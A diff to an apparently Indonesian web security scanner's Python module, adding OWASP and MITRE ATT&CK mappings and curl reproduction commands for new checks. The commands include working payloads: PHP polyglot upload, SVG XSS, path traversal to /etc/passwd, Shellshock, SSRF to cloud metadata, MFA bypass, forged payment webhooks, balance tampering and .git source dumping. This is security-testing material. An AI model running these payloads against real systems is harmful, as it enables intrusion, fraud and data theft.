@@ -140,6 +140,33 @@ OWASP_MAP: dict[str, str] = {
     # Simulate
     "rate_limit": "A07:2021 Identification & Authentication Failures",
     "burst": "A04:2021 Insecure Design",
+
+    # ============ DEEP SCANNERS (PR #9 + PR #10) ============
+    # PR #9
+    "db_exposure": "A05:2021 Security Misconfiguration",
+    "saldo_deep": "A04:2021 Insecure Design",
+    "file_inject": "A05:2021 Security Misconfiguration",
+    "webhook_deep": "A08:2021 Software & Data Integrity Failures",
+    "subdomain_access": "A05:2021 Security Misconfiguration",
+    # PR #10 - active
+    "shellshock": "A06:2021 Vulnerable & Outdated Components",
+    "mfa_bypass": "A07:2021 Identification & Authentication Failures",
+    "password_policy": "A07:2021 Identification & Authentication Failures",
+    # PR #10 - passive
+    "referrer_policy": "A05:2021 Security Misconfiguration",
+    "permission_policy": "A05:2021 Security Misconfiguration",
+    "coop_coep": "A05:2021 Security Misconfiguration",
+    "hash_disclosure": "A02:2021 Cryptographic Failures",
+    # PR #10 - recon
+    "git_disclosure": "A05:2021 Security Misconfiguration",
+    "svn_disclosure": "A05:2021 Security Misconfiguration",
+    "ds_store_leak": "A05:2021 Security Misconfiguration",
+    "iis_shortname": "A05:2021 Security Misconfiguration",
+    "wp_scan": "A06:2021 Vulnerable & Outdated Components",
+    "joomla_scan": "A06:2021 Vulnerable & Outdated Components",
+    "drupal_scan": "A06:2021 Vulnerable & Outdated Components",
+    "vhost_brute": "A05:2021 Security Misconfiguration",
+    "waf_detect": "Informasional",
 }
 
 # --------------------------- MITRE ATT&CK --------------------------------
@@ -264,6 +291,29 @@ MITRE_MAP: dict[str, str] = {
     # Simulate
     "rate_limit": "T1110 Brute Force",
     "burst": "T1499 Endpoint Denial of Service",
+
+    # ============ DEEP SCANNERS (PR #9 + PR #10) ============
+    "db_exposure": "T1213 Data from Information Repositories",
+    "saldo_deep": "T1565.003 Runtime Data Manipulation",
+    "file_inject": "T1190 / T1505.003 Web Shell",
+    "webhook_deep": "T1565.001 Stored Data Manipulation",
+    "subdomain_access": "T1592 Gather Victim Host Information",
+    "shellshock": "T1190 Exploit Public-Facing Application (CVE-2014-6271)",
+    "mfa_bypass": "T1111 Multi-Factor Authentication Interception",
+    "password_policy": "T1110.001 Password Guessing",
+    "referrer_policy": "T1592 Gather Victim Host Information",
+    "permission_policy": "T1190 Exploit Public-Facing Application",
+    "coop_coep": "T1190 Exploit Public-Facing Application",
+    "hash_disclosure": "T1552.001 Credentials In Files",
+    "git_disclosure": "T1213.003 Code Repositories",
+    "svn_disclosure": "T1213.003 Code Repositories",
+    "ds_store_leak": "T1083 File and Directory Discovery",
+    "iis_shortname": "T1083 File and Directory Discovery",
+    "wp_scan": "T1592.002 Software (WordPress)",
+    "joomla_scan": "T1592.002 Software (Joomla!)",
+    "drupal_scan": "T1592.002 Software (Drupal)",
+    "vhost_brute": "T1590.005 Gather Victim Network Information: IP Addresses",
+    "waf_detect": "T1592.002 Software (WAF/CDN)",
 }
 
 # --------------------------- Cara Reproduksi -----------------------------
@@ -455,4 +505,166 @@ REPRO_MAP: dict[str, str] = {
         "2. Bila tidak ada lockout/CAPTCHA setelah N percobaan -> rate-limit absen."
     ),
     "burst": "# Kirim 100 request paralel dengan ab atau hey, lihat apakah ada throttle",
+
+    # ============ DEEP SCANNERS (PR #9 + PR #10) ============
+    "db_exposure": (
+        "# Probe panel admin DB:\n"
+        "curl -i {url}/phpmyadmin/\ncurl -i {url}/adminer.php\n"
+        "# Probe REST data store:\n"
+        "curl -i {url}/_cat/indices?v\ncurl -i {url}/_all_dbs\n"
+        "# Probe DB dump:\n"
+        "curl -I {url}/backup.sql\ncurl -I {url}/db.sqlite\n"
+        "# GraphQL introspection:\n"
+        "curl -X POST {url}/graphql -H 'Content-Type: application/json' \\\n"
+        "  -d '{{\"query\":\"{{ __schema {{ types {{ name fields {{ name }} }} }} }}\"}}'"
+    ),
+    "saldo_deep": (
+        "# Tampering nilai saldo (login dulu kalau perlu):\n"
+        "for amt in -1 0 1e-10 9223372036854775808 0.4999 NaN; do\n"
+        "  curl -X POST {url} -d \"amount=$amt\"\ndone\n"
+        "# Race condition:\n"
+        "for i in $(seq 1 5); do curl -X POST {url} -d 'amount=1' & done\n"
+        "# Idempotency abuse:\n"
+        "curl -X POST {url} -H 'Idempotency-Key: test001' -d 'amount=1'\n"
+        "curl -X POST {url} -H 'Idempotency-Key: test001' -d 'amount=1'"
+    ),
+    "file_inject": (
+        "# Upload polyglot file:\n"
+        "echo -e '\\xff\\xd8\\xff\\xe0<?php phpinfo();' > poly.jpg.php\n"
+        "curl -F 'file=@poly.jpg.php' {url}\n"
+        "# SVG XSS payload:\n"
+        "echo '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>' > x.svg\n"
+        "curl -F 'file=@x.svg' {url}\n"
+        "# LFI via file param:\n"
+        "curl '{url}?file=../../../../etc/passwd'"
+    ),
+    "webhook_deep": (
+        "# Webhook tanpa signature (Midtrans-style):\n"
+        "curl -X POST {url}/api/midtrans/notify -H 'Content-Type: application/json' \\\n"
+        "  -d '{{\"transaction_status\":\"settlement\",\"order_id\":\"test-001\","
+        "\"gross_amount\":\"10000.00\"}}'\n"
+        "# Replay (kirim 2x identik) -> server harus dedupe:\n"
+        "curl -X POST {url}/api/webhook -d @payload.json\n"
+        "curl -X POST {url}/api/webhook -d @payload.json\n"
+        "# SSRF via webhook config:\n"
+        "curl -X POST {url}/api/webhooks/subscribe \\\n"
+        "  -d '{{\"webhook_url\":\"http://169.254.169.254/latest/meta-data/\"}}'"
+    ),
+    "subdomain_access": (
+        "# Probe semua subdomain hidup:\n"
+        "for sub in admin dev staging api jenkins kibana grafana vault; do\n"
+        "  curl -kI https://$sub.{host}/ 2>/dev/null | head -1\ndone\n"
+        "# Cek panel internal (Jenkins, etc.):\n"
+        "curl -k https://jenkins.{host}/ | grep -i 'jenkins'"
+    ),
+    "shellshock": (
+        "# Vector 1 - echo marker:\n"
+        "curl -A '() {{ :;}}; /bin/echo VULN-CHECK' {url}/cgi-bin/test.cgi\n"
+        "# Vector 2 - time-based:\n"
+        "time curl -A '() {{ :;}}; /bin/sleep 5' {url}/cgi-bin/test.cgi\n"
+        "# Bila response tertunda 5 detik atau marker echo balik -> rentan."
+    ),
+    "mfa_bypass": (
+        "# Status forgery:\n"
+        "curl -X POST {url}/verify-2fa \\\n"
+        "  -d '{{\"code\":\"000000\",\"verified\":true,\"is_2fa_passed\":true}}'\n"
+        "# GET method swap:\n"
+        "curl {url}/verify-2fa?code=000000\n"
+        "# Skip-step (akses dashboard tanpa OTP):\n"
+        "curl -b 'session=...' {url}/dashboard"
+    ),
+    "password_policy": (
+        "# Test register dengan password lemah:\n"
+        "for pw in '' '1' '12345' 'password' 'qwerty'; do\n"
+        "  curl -X POST {url}/register \\\n"
+        "    -d \"email=test_$RANDOM@example.com&password=$pw&password_confirmation=$pw\"\n"
+        "done\n"
+        "# Bandingkan response: yang sukses = policy lemah."
+    ),
+    "referrer_policy": (
+        "curl -I {url}\n"
+        "# Cek header `Referrer-Policy`. Nilai aman: strict-origin-when-cross-origin.\n"
+        "# Nilai bahaya: unsafe-url, no-referrer-when-downgrade."
+    ),
+    "permission_policy": (
+        "curl -I {url}\n"
+        "# Cek header `Permissions-Policy`. Best practice: default-deny + opt-in.\n"
+        "#   contoh: Permissions-Policy: camera=(), microphone=(), geolocation=(self)"
+    ),
+    "coop_coep": (
+        "curl -I {url}\n"
+        "# Cek 3 header isolasi:\n"
+        "#   Cross-Origin-Opener-Policy: same-origin\n"
+        "#   Cross-Origin-Embedder-Policy: require-corp\n"
+        "#   Cross-Origin-Resource-Policy: same-origin"
+    ),
+    "hash_disclosure": (
+        "# Cari pola hash di response:\n"
+        "curl {url} | grep -E '\\$2[abxy]?\\$|argon2|eyJ[A-Za-z0-9_-]+\\.eyJ'\n"
+        "# Periksa endpoint /api/users yang sering bocor password_hash."
+    ),
+    "git_disclosure": (
+        "# Confirm exposure:\n"
+        "curl -i {url}/.git/HEAD\ncurl -i {url}/.git/config\n"
+        "# Auto-dump:\n"
+        "git-dumper {url}/.git/ ./loot/\n"
+        "cd ./loot && git log -p   # cari secret di history"
+    ),
+    "svn_disclosure": (
+        "curl -i {url}/.svn/entries\n"
+        "curl -i {url}/.svn/wc.db   # SQLite working-copy DB"
+    ),
+    "ds_store_leak": (
+        "curl -I {url}/.DS_Store\n"
+        "# Parse isi:\n"
+        "curl -s {url}/.DS_Store | python3 -c \"import sys; d=sys.stdin.buffer.read(); "
+        "print('magic OK' if d.startswith(b'\\x00\\x00\\x00\\x01Bud1') else 'no')\""
+    ),
+    "iis_shortname": (
+        "# IIS short-filename probe:\n"
+        "curl -i '{url}/*~1.aspx'\n"
+        "curl -i '{url}/a*~1.aspx'\n"
+        "# Bila 4 URL pasangan response berbeda -> IIS rentan disclosure."
+    ),
+    "wp_scan": (
+        "# Fingerprint:\n"
+        "curl -s {url} | grep -i 'wp-content\\|wp-includes\\|generator.*WordPress'\n"
+        "# User enum:\n"
+        "for i in 1 2 3; do curl -s -o /dev/null -w '%{{http_code}} %{{redirect_url}}\\n' "
+        "{url}?author=$i; done\n"
+        "curl {url}/wp-json/wp/v2/users\n"
+        "# xmlrpc check:\n"
+        "curl -X POST {url}/xmlrpc.php -d \\\n"
+        "  '<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName>"
+        "<params/></methodCall>'"
+    ),
+    "joomla_scan": (
+        "# Fingerprint:\n"
+        "curl -s {url} | grep -i 'joomla\\|com_users'\n"
+        "# Critical: installation directory belum dihapus:\n"
+        "curl -i {url}/installation/index.php\n"
+        "curl -i {url}/administrator/\ncurl -i {url}/htaccess.txt"
+    ),
+    "drupal_scan": (
+        "curl -s {url}/CHANGELOG.txt | head -3   # versi exact\n"
+        "# User enum:\n"
+        "for i in 1 2 3; do curl -s {url}/?q=user/$i | grep -oE '<h1[^>]*>[^<]+</h1>'; done\n"
+        "# JSON:API:\n"
+        "curl {url}/jsonapi/user/user"
+    ),
+    "vhost_brute": (
+        "# Bandingkan response untuk Host header berbeda:\n"
+        "curl -i -H 'Host: {host}' {url}\n"
+        "curl -i -H 'Host: admin.{host}' {url}\n"
+        "curl -i -H 'Host: dev.{host}' {url}\n"
+        "curl -i -H 'Host: jenkins.{host}' {url}\n"
+        "# Signature berbeda -> vhost ada di server tapi tidak di DNS publik."
+    ),
+    "waf_detect": (
+        "curl -I {url}\n"
+        "# Lihat header: cf-ray (Cloudflare), x-akamai-* (Akamai),\n"
+        "#   x-sucuri-id, x-iinfo (Imperva), x-amz-cf-id (CloudFront).\n"
+        "# Trigger WAF lalu lihat respons block-page:\n"
+        "curl '{url}?id=1%27%20OR%201%3D1--'"
+    ),
 }
